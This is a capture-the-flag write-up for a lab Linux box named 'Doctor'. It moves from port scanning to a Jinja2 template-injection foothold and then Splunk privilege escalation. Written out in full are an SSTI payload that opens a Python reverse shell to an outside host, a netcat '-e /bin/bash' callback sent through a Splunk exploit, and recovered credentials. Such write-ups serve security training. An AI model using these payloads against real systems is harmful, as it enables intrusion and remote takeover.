# Doctor
This box is a Linux one made by egotisticalSW and its IP is 10.10.10.209.
Let's dive in.
We start by a complete nmap scan:

```
$ nmap -p- -sC -sV -oA nmap/complete 10.10.10.209
Nmap scan report for 10.10.10.209
Host is up (0.017s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 80 shows a website with some lorem ipsum. It discloses a new hostname:

```
Send us a message:
info@doctors.htb
```

We add both host names to our /etc/hosts file

```
$ echo "10.10.10.209    doctor.htb doctors.htb" >> /etc/hosts
```

We check the `doctors.htb` website, and access the "Doctor Secure Messaging"
web app. We register an account and check what's available to us.

```
Your account has been created, with a time limit of twenty minutes!
```

This webapp allows doctor to upload messages. A message has a title and content.
We'll gobuster the app to find every endpoints:

```
$ gobuster dir --url http://doctors.htb --wordlist ./raft-small-directories -x .php,.txt -c "session=..."
===============================================================
2020/12/01 11:00:15 Starting gobuster
===============================================================
/logout (Status: 302)
/login (Status: 302)
/register (Status: 302)
/home (Status: 200)
/archive (Status: 200)
/account (Status: 200)
```

/archive endpoint looks interesting, let's check it out:
Firefox serves a blank page, code shows an rss feed channel.
Let's try again with curl

```
$ curl http://doctors.htb/archive --cookie "session=.eJ..."

        <?xml version="1.0" encoding="UTF-8" ?>
	      <rss version="2.0">
	      	   <channel>
			<title>Archive</title>
				<item><title>Hello</title></item>

						</channel>

```

Same results as firefox. Looking at response headers i found this:

```
Server: Werkzeug/1.0.1 Python/3.8.2
```

I'm almost sure we are in the context of a Flask application, and are
looking at Server Side Template Injection.
We create a message with title "{{ 7 * 7 }}";
/archive endpoint names the entry "49". We have a confirmed SSTI.

From "PayloadAllTheThings" for Jinja2 (flask's template renderer)
we tried injecting "{{ config.items() }}" and exfil this, then prettified:

```
dict_items(
  [
      ('ENV', 'production'),
      ('DEBUG', False),
      ('TESTING', False),
      ('PROPAGATE_EXCEPTIONS', None),
      ('PRESERVE_CONTEXT_ON_EXCEPTION', None),
      ('SECRET_KEY', '1234'),
      ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)),
      ('USE_X_SENDFILE', False),
      ('SERVER_NAME', None),
      ('APPLICATION_ROOT', '/'),
      ('SESSION_COOKIE_NAME', 'session'),
      ('SESSION_COOKIE_DOMAIN', False),
      ('SESSION_COOKIE_PATH', None),
      ('SESSION_COOKIE_HTTPONLY', True),
      ('SESSION_COOKIE_SECURE', False),
      ('SESSION_COOKIE_SAMESITE', None),
      ('SESSION_REFRESH_EACH_REQUEST', True),
      ('MAX_CONTENT_LENGTH', None),
      ('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(seconds=43200)),
      ('TRAP_BAD_REQUEST_ERRORS', None),
      ('TRAP_HTTP_EXCEPTIONS', False),
      ('EXPLAIN_TEMPLATE_LOADING', False),
      ('PREFERRED_URL_SCHEME', 'http'),
      ('JSON_AS_ASCII', True),
      ('JSON_SORT_KEYS', True),
      ('JSONIFY_PRETTYPRINT_REGULAR', False),
      ('JSONIFY_MIMETYPE', 'application/json'),
      ('TEMPLATES_AUTO_RELOAD', None),
      ('MAX_COOKIE_SIZE', 4093),
      ('MAIL_PASSWORD', 'doctor'),
      ('MAIL_PORT', 587),
      ('MAIL_SERVER', ''),
      ('MAIL_USERNAME', 'doctor'),
      ('MAIL_USE_TLS', True),
      ('SQLALCHEMY_DATABASE_URI', 'sqlite://///home/web/blog/flaskblog/site.db'),
      ('WTF_CSRF_CHECK_DEFAULT', False),
      ('SQLALCHEMY_BINDS', None),
      ('SQLALCHEMY_NATIVE_UNICODE', None),
      ('SQLALCHEMY_ECHO', False),
      ('SQLALCHEMY_RECORD_QUERIES', None),
      ('SQLALCHEMY_POOL_SIZE', None),
      ('SQLALCHEMY_POOL_TIMEOUT', None),
      ('SQLALCHEMY_POOL_RECYCLE', None),
      ('SQLALCHEMY_MAX_OVERFLOW', None),
      ('SQLALCHEMY_COMMIT_ON_TEARDOWN', False),
      ('SQLALCHEMY_TRACK_MODIFICATIONS', None),
      ('SQLALCHEMY_ENGINE_OPTIONS', {})
  ]
)
```
Not much is interesting, except for the "doctor:doctor" mail credentials. We'll
have to check for some mail server on the box once in as user.

This payload allows us to get a reverse shell:
```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.45\",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\"]);'").read()}}{%endif%}{% endfor %}

```

We got a shell on our netcat listener as user "web".
I've immediately added a ssh key to /home/web/.ssh/authorized_keys, then
logged in as web.
```
web@doctor:~$ ls
blog blog.sh
```

I'll upload linpeas.sh, then exfil the report;
Found some bcrypt hash. Difficulty: 12. FML.
Reading more on linpeas.out, found this:

```
/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
```

We use that password to log in as `shaun`:

```
web@doctor:~$ su shaun
Password: Guitar123
shaun@doctor:~$ cat ~/user.txt | wc -c
33
```
We've owned user shaun. Moving on to privesc.
We start by running Linpeas.sh again as shaun for stuff we might have
missed with user "web".

After searching around about that splunk installation we saw during the
starting nmap scan, we find that Splunk should be vulnerable to
Local Privilege Escalation when ran from inside the box.
Testing Splunk API with Shaun's credentials shows we have the right creds
for using it.

Using a slightly modified version of this exploit, we're able to get privilege
escalation from a remote host:
https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py


```
python3 splunk_whisperer_remote.py --host doctor.htb --lhost 10.10.14.45 --lport 8989 --username shaun --password Guitar123 --payload "nc.traditional -e /bin/bash '10.10.14.45' '4444'"
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpun1bdjhh.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.45:8989/
10.10.10.209 - - [01/Dec/2020 22:29:20] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup
```

On our reverse shell:

```
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.45] from (UNKNOWN) [10.10.10.209] 34154
cat /root/root.txt | wc -c
33
```

We've owned the root account.
